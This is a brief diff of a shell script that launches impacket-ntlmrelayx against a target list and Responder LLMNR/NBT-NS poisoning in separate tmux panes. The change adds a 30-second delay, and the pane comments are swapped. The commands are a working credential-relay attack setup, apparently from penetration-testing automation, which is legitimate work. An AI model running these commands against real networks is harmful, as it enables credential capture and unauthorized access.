@@ -20,6 +20,7 @@ tmux new-session -s tmux-2 -d
 # Run ntlmrelayx in tmux-1
 tmux send-keys -t tmux-2 'sudo impacket-ntlmrelayx -tf targets.txt -i' C-m
 
+sleep 30
 
 # Run responder in tmux-2
 tmux send-keys -t tmux-1 'sudo responder -I eth0 -dw' C-m
